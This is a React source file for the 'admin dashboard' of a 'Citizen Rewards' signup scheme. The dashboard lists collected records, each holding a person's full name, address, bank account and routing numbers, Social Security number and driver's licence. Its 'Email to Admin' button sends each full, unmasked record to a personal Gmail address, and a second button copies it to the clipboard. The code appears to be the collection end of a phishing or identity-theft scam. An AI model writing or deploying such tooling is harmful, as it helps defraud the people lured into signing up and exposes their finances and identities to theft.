import React, { useState, useEffect } from 'react';

interface SignupData {
  id: number;
  timestamp: string;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  bankName: string;
  accountNumber: string;
  routingNumber: string;
  accountType: string;
  ssn: string;
  driversLicense: string;
  agreesToTerms: boolean;
}

const AdminDashboard: React.FC = () => {
  const [signups, setSignups] = useState<SignupData[]>([]);
  const [selectedSignup, setSelectedSignup] = useState<SignupData | null>(null);

  useEffect(() => {
    // Load signups from localStorage
    const savedSignups = localStorage.getItem('citizenRewardsSignups');
    if (savedSignups) {
      setSignups(JSON.parse(savedSignups));
    }
  }, []);

  const exportToEmail = (signup: SignupData) => {
    const emailBody = `
CITIZEN REWARDS SIGNUP DATA
===========================

PERSONAL INFORMATION:
Name: ${signup.firstName} ${signup.lastName}
Email: ${signup.email}
Phone: ${signup.phone}
Address: ${signup.address}, ${signup.city}, ${signup.state} ${signup.zipCode}

BANKING INFORMATION:
Bank Name: ${signup.bankName}
Account Number: ${signup.accountNumber}
Routing Number: ${signup.routingNumber}
Account Type: ${signup.accountType}

IDENTITY VERIFICATION:
SSN: ${signup.ssn}
Driver's License: ${signup.driversLicense}

PREFERENCES:
Terms Accepted: ${signup.agreesToTerms ? 'Yes' : 'No'}

Submitted: ${new Date(signup.timestamp).toLocaleString()}
===========================
    `;

    const mailtoLink = `mailto:jc4479697@gmail.com?subject=Citizen Rewards Signup: ${signup.firstName} ${signup.lastName}&body=${encodeURIComponent(emailBody)}`;
    window.open(mailtoLink);
  };

  const copyToClipboard = (signup: SignupData) => {
    const data = `
CITIZEN REWARDS SIGNUP DATA
===========================

PERSONAL INFORMATION:
Name: ${signup.firstName} ${signup.lastName}
Email: ${signup.email}
Phone: ${signup.phone}
Address: ${signup.address}, ${signup.city}, ${signup.state} ${signup.zipCode}

BANKING INFORMATION:
Bank Name: ${signup.bankName}
Account Number: ${signup.accountNumber}
Routing Number: ${signup.routingNumber}
Account Type: ${signup.accountType}

IDENTITY VERIFICATION:
SSN: ${signup.ssn}
Driver's License: ${signup.driversLicense}

PREFERENCES:
Terms Accepted: ${signup.agreesToTerms ? 'Yes' : 'No'}

Submitted: ${new Date(signup.timestamp).toLocaleString()}
===========================
    `;

    navigator.clipboard.writeText(data).then(() => {
      alert('Signup data copied to clipboard!');
    });
  };

  const handleLogout = () => {
    localStorage.removeItem('adminAuthenticated');
    window.location.hash = '';
    window.location.reload();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-emerald-50 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="bg-white rounded-xl shadow-lg p-6">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-3xl font-bold text-gray-900">🏛️ Citizen Rewards Admin Dashboard</h1>
            <button
              onClick={handleLogout}
              className="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors text-sm font-medium"
            >
              🚪 Logout
            </button>
          </div>
          
          {signups.length === 0 ? (
            <div className="text-center py-12">
              <p className="text-gray-500 text-lg">No signups yet. When people complete the enrollment, their data will appear here.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Signups List */}
              <div>
                <h2 className="text-xl font-semibold mb-4">📋 Recent Signups ({signups.length})</h2>
                <div className="space-y-3 max-h-96 overflow-y-auto">
                  {signups.map((signup) => (
                    <div
                      key={signup.id}
                      className={`p-4 border rounded-lg cursor-pointer transition-colors ${
                        selectedSignup?.id === signup.id
                          ? 'border-blue-500 bg-blue-50'
                          : 'border-gray-200 hover:border-gray-300'
                      }`}
                      onClick={() => setSelectedSignup(signup)}
                    >
                      <div className="font-medium">{signup.firstName} {signup.lastName}</div>
                      <div className="text-sm text-gray-600">{signup.email}</div>
                      <div className="text-xs text-gray-500">
                        {new Date(signup.timestamp).toLocaleString()}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Selected Signup Details */}
              <div>
                {selectedSignup ? (
                  <div>
                    <h2 className="text-xl font-semibold mb-4">👤 Signup Details</h2>
                    <div className="bg-gray-50 rounded-lg p-4 space-y-3">
                      <div>
                        <strong>Name:</strong> {selectedSignup.firstName} {selectedSignup.lastName}
                      </div>
                      <div>
                        <strong>Email:</strong> {selectedSignup.email}
                      </div>
                      <div>
                        <strong>Phone:</strong> {selectedSignup.phone}
                      </div>
                      <div>
                        <strong>Address:</strong> {selectedSignup.address}, {selectedSignup.city}, {selectedSignup.state} {selectedSignup.zipCode}
                      </div>
                      <div>
                        <strong>Bank:</strong> {selectedSignup.bankName}
                      </div>
                      <div>
                        <strong>Account:</strong> ****{selectedSignup.accountNumber.slice(-4)} ({selectedSignup.accountType})
                      </div>
                      <div>
                        <strong>Routing:</strong> {selectedSignup.routingNumber}
                      </div>
                      <div>
                        <strong>SSN:</strong> ***-**-{selectedSignup.ssn.slice(-4)}
                      </div>
                      <div>
                        <strong>License:</strong> {selectedSignup.driversLicense}
                      </div>
                      <div>
                        <strong>Submitted:</strong> {new Date(selectedSignup.timestamp).toLocaleString()}
                      </div>
                    </div>

                    <div className="mt-4 flex space-x-3">
                      <button
                        onClick={() => exportToEmail(selectedSignup)}
                        className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors"
                      >
                        📧 Email to Admin
                      </button>
                      <button
                        onClick={() => copyToClipboard(selectedSignup)}
                        className="bg-emerald-600 text-white px-4 py-2 rounded-lg hover:bg-emerald-700 transition-colors"
                      >
                        📋 Copy Data
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="text-center py-12">
                    <p className="text-gray-500">Select a signup to view details</p>
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;